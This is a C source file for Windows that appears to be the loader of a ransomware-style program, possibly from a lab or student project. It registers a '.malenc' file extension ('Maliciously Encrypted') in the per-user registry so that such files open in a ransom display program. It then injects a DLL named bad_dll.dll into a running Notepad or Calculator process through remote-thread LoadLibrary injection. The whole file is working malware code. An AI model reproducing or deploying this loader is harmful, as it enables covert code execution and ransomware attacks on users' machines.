#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <stdio.h>

#include "get_relative_path.h"
#include "attack.h"

// Function to register a file extension to your executable
int RegisterFileExtension(const char* extension, const char* progID, const char* exePath)
{
    if (!extension || !progID || !exePath)
        return -1; // Invalid input

    HKEY hKey;
    LONG result;
    char commandKey[512];

    // Delete UserChoice to avoid Windows cache overriding
    char userChoiceKey[256];
    snprintf(userChoiceKey, sizeof(userChoiceKey),
             "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\%s\\UserChoice",
             extension);
    RegDeleteKeyA(HKEY_CURRENT_USER, userChoiceKey);

    // Associate extension with ProgID (per-user)
    result = RegCreateKeyExA(HKEY_CURRENT_USER, extension, 0, NULL,
                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        printf("Error creating extension key\n");
        return 1;
    }
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)progID, (DWORD)(strlen(progID) + 1));
    RegCloseKey(hKey);

    // Set the command to run display.exe
    snprintf(commandKey, sizeof(commandKey), "Software\\Classes\\%s\\shell\\open\\command", progID);

    result = RegCreateKeyExA(HKEY_CURRENT_USER, commandKey, 0, NULL,
                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        printf("Error creating command key\n");
        return 2;
    }

    char commandWithArg[1024];
    snprintf(commandWithArg, sizeof(commandWithArg), "\"%s\" \"%%1\"", exePath); // important quotes & %1
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)commandWithArg, (DWORD)(strlen(commandWithArg) + 1));
    RegCloseKey(hKey);

    // Refresh Explorer to apply association immediately
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);

    return 0; // Success
}

DWORD get_pid_from_list(const char *names[], size_t count)
{
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 1;

    if (Process32First(snapshot, &pe)) {
        do {
            for (size_t i = 0; i < count; i++) {
                if (_stricmp(pe.szExeFile, names[i]) == 0) {
                    CloseHandle(snapshot);
                    return pe.th32ProcessID;
                }
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return 1; // No process found
}

int main(void) {
    // List of process names to target
    const char *processes[] = {
        "notepad.exe",
        "calc.exe",
    };


    /* Associate Ransom_display.exe with .malenc file format */
    const char* extension = ".malenc";
    const char* progID = "Maliciously Encrypted";
    char exePath [MAX_PATH];
    if (get_relative_path(exePath, sizeof(exePath), "ransom_display.exe") != 0) {
        return 1;
    }

    if (RegisterFileExtension(extension, progID, exePath) != 0) {
        return 1;
    };

    char dll[MAX_PATH];
    if (get_relative_path(dll, sizeof(dll), "bad_dll.dll") != 0) {
        return 1;
    }

    DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));

    if (!pid)
        return 1;

    // Get process handle
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (h_process == NULL)
    {
        return 1;
    }

    // Allocate memory
    LPVOID mem_alloc = VirtualAllocEx(h_process, NULL, strlen(dll) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    if (mem_alloc == NULL)
    {
        return 1;
    }

    // Write dll into memory
    WriteProcessMemory(h_process, mem_alloc, dll, strlen(dll) + 1, NULL);

    // Get handle to kernel32.dll
    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");

    if (h_kernel32 == NULL)
    {
        return 1;
    }

    // Create thread executing the dll
    FARPROC load_library_addr = GetProcAddress(h_kernel32, "LoadLibraryA");
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_addr, mem_alloc, 0, NULL);

    if (h_thread == NULL)
    {
        return 1;
    }

    // Wait and close
    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_process);

    return 0;
}